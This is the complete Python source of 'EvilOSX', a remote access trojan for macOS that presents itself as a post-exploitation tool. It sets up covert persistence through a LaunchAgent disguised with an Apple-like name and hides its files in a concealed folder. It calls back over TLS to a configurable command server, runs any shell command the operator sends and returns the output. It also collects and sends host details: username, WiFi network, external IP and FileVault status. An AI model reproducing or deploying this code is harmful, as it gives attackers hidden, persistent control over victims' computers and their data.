#!/usr/bin/env python
# A pure python, post-exploitation, remote administration tool (RAT) for macOS / OS X.

import socket
import ssl
import os
import subprocess
from threading import Timer
import time
import platform
import base64

MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"

development = True


def kill_client():
    launch_agent_name = "com.apple.EvilOSX"
    launch_agent_file = os.path.expanduser("~/Library/LaunchAgents/{0}.plist".format(launch_agent_name))

    os.system("rm -f {0}".format(launch_agent_file))
    os.system("rm -rf {0}/".format(program_folder))
    os.system("launchctl remove {0}".format(launch_agent_name))
    exit()


def get_wifi():
    command = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport \
               -I | grep -w SSID"

    return execute_command(command).split("SSID: ")[1]


def get_external_ip():
    command = "curl --silent https://wtfismyip.com/text"

    return execute_command(command)


def get_computer_name():
    return execute_command("scutil --get LocalHostName").replace("\n", "")


def get_model():
    model_key = execute_command("sysctl hw.model").split(" ")[1]

    if not model_key:
        model_key = "Macintosh"

    model = execute_command("/usr/libexec/PlistBuddy -c 'Print :\"{0}\"' /System/Library/PrivateFrameworks/ServerInformation.framework/Versions/A/Resources/English.lproj/SIMachineAttributes.plist | grep marketingModel".format(model_key))

    return model.split("= ")[1]


def execute_command(command, cleanup=True):
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()

    if cleanup:
        return output.replace("\n", "")
    else:
        return output


def setup_persistence(program_folder):
    launch_agent_name = "com.apple.EvilOSX"
    launch_agent_file = os.path.expanduser("~/Library/LaunchAgents/{0}.plist".format(launch_agent_name))

    program_file = program_folder + "/EvilOSX"

    # Create directories
    execute_command("mkdir -p ~/Library/LaunchAgents/")
    execute_command("mkdir -p {0}".format(program_folder))

    # Create launch agent
    print MESSAGE_INFO + "Creating launch agent..."

    launch_agent_create = '''\
    <?xml version="1.0" encoding="UTF-8"?>
    <plist version="1.0">
       <dict>
          <key>Label</key>
          <string>{0}</string>
          <key>ProgramArguments</key>
          <array>
             <string>{1}</string>
          </array>
          <key>StartInterval</key>
          <integer>5</integer>
       </dict>
    </plist>
    '''.format(launch_agent_name, program_file)

    with open(launch_agent_file, 'wb') as content:
        content.write(launch_agent_create)

    # Move EvilOSX
    print MESSAGE_INFO + "Moving EvilOSX..."

    if development:
        with open(__file__, 'rb') as content:
            with open(program_file, 'wb') as binary:
                binary.write(content.read())
    else:
        os.rename(__file__, program_file)
    os.chmod(program_file, 0777)

    # Load launch agent
    print MESSAGE_INFO + "Loading launch agent..."
    out = subprocess.Popen("launchctl load -w {0}".format(launch_agent_file), shell=True, stderr=subprocess.PIPE).stderr.read()

    if out == '':
        if execute_command("launchctl list | grep -w {0}".format(launch_agent_name)):
            print MESSAGE_INFO + "Done!"
            exit()
        else:
            print MESSAGE_ATTENTION + "Failed to load launch agent."
            pass
    elif "already loaded" in out.lower():
        print MESSAGE_ATTENTION + "EvilOSX is already loaded."
        exit()
    else:
        print MESSAGE_ATTENTION + "Unexpected output: " + out
        pass


def start_server():
    print MESSAGE_INFO + "Starting EvilOSX..."
    os.chdir(os.path.expanduser("~"))

    while True:
        # Connect to server.
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(None)

        server_socket = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, cert_reqs=ssl.CERT_NONE)

        try:
            print MESSAGE_INFO + "Connecting..."
            server_socket.connect((SERVER_HOST, SERVER_PORT))
            print MESSAGE_INFO + "Connected."
        except socket.error as error:
            if error.errno == 61:
                print MESSAGE_ATTENTION + "Connection refused."
                pass
            else:
                print MESSAGE_ATTENTION + "Failed to connect: {0}".format(error.strerror)
                pass
            time.sleep(5)
            continue

        while True:
            command = server_socket.recv(4096)

            if not command:
                print MESSAGE_ATTENTION + "Server disconnected."
                break  # Start listening again (goes to previous while loop).

            print MESSAGE_INFO + "Received command: " + command

            if command == "get_computer_name":
                server_socket.sendall(get_computer_name())
            elif command == "get_shell_info":
                shell_info = execute_command("whoami") + "\n" + get_computer_name() + "\n" + execute_command("pwd")

                server_socket.sendall(shell_info)
            elif command == "get_info":
                system_version = str(platform.mac_ver()[0])
                battery = execute_command("pmset -g batt").split('\t')[1].split(";")
                filevault = execute_command("fdesetup status")

                response = MESSAGE_INFO + "System version: " + system_version + "\n"
                response += MESSAGE_INFO + "Model: " + get_model() + "\n"
                response += MESSAGE_INFO + "Battery: " + battery[0] + battery[1] + ".\n"
                response += MESSAGE_INFO + "WiFi network: " + get_wifi() + " (" + get_external_ip() + ")\n"
                response += MESSAGE_INFO + "Shell location: " + __file__ + "\n"
                if "On" in filevault:
                    response += MESSAGE_ATTENTION + "FileVault is on.\n"
                else:
                    response += MESSAGE_INFO + "FileVault is off.\n"

                server_socket.sendall(response)
            elif command == "kill_client":
                server_socket.sendall("Farewell.")
                kill_client()
            else:
                # Regular shell command
                if len(command) > 3 and command[0:3] == "cd ":
                    try:
                        os.chdir(command[3:])
                        server_socket.sendall(base64.b64encode("EMPTY"))
                    except OSError:
                        server_socket.sendall(base64.b64encode("EMPTY"))
                        pass
                else:
                    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    timer = Timer(5, lambda process: process.kill(), [process])

                    try:
                        timer.start()  # Kill process after 5 seconds
                        stdout, stderr = process.communicate()
                        response = stdout + stderr

                        if not response:
                            server_socket.sendall(base64.b64encode("EMPTY"))
                        else:
                            server_socket.sendall(base64.b64encode(response))
                    finally:
                        timer.cancel()

        server_socket.close()


current_folder = os.path.dirname(os.path.realpath(__file__))
program_folder = os.path.expanduser("~/Library/Containers/.EvilOSX")

if current_folder.lower() != program_folder.lower():
    setup_persistence(program_folder)

#########################
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 1337
#########################

if __name__ == '__main__':
    start_server()
